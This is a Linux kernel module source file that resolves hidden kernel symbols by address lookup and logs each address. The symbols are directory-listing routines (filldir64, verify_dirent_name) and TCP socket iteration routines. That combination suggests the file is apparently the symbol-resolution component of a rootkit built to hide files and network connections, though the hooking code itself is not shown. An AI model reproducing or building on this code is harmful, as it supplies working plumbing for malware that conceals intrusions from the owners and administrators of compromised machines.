#include <linux/types.h>
#include <linux/kernel.h>

#include <ksyms.h>

unsigned long (*ksyms__kallsyms_lookup_name)(const char *name) = 0;

int (*ksyms__filldir64)(struct dir_context *ctx, const char *name, int namlen, loff_t offset, u64 ino, unsigned int d_type) = 0;
int (*ksyms__verify_dirent_name)(const char *name, int len) = 0;

void *(*ksyms__listening_get_next)(struct seq_file *seq, void *cur) = 0;
void *(*ksyms__tcp_get_idx)(struct seq_file *seq, loff_t pos) = 0;
void *(*ksyms__established_get_first)(struct seq_file *seq) = 0;
void *(*ksyms__established_get_next)(struct seq_file *seq, void *cur) = 0;

void resolve_ksyms(void *kallsyms_lookup_name_p) {
    ksyms__kallsyms_lookup_name = kallsyms_lookup_name_p;

    ksyms__filldir64 = (void *)ksyms__kallsyms_lookup_name("filldir64");
    printk(KERN_INFO "ksyms: filldir64 = %p", ksyms__filldir64);
    ksyms__verify_dirent_name = (void *)ksyms__kallsyms_lookup_name("verify_dirent_name");
    printk(KERN_INFO "ksyms: verify_dirent_name = %p", ksyms__verify_dirent_name);
    
    ksyms__listening_get_next = (void *)ksyms__kallsyms_lookup_name("listening_get_next");
    printk(KERN_INFO "ksyms: listening_get_next = %p", ksyms__listening_get_next);
    ksyms__tcp_get_idx = (void *)ksyms__kallsyms_lookup_name("tcp_get_idx");
    printk(KERN_INFO "ksyms: tcp_get_idx = %p", ksyms__tcp_get_idx);
    ksyms__established_get_first = (void *)ksyms__kallsyms_lookup_name("established_get_first");
    printk(KERN_INFO "ksyms: established_get_first = %p", ksyms__established_get_first);
    ksyms__established_get_next = (void *)ksyms__kallsyms_lookup_name("established_get_next");
    printk(KERN_INFO "ksyms: established_get_next = %p", ksyms__established_get_next);
}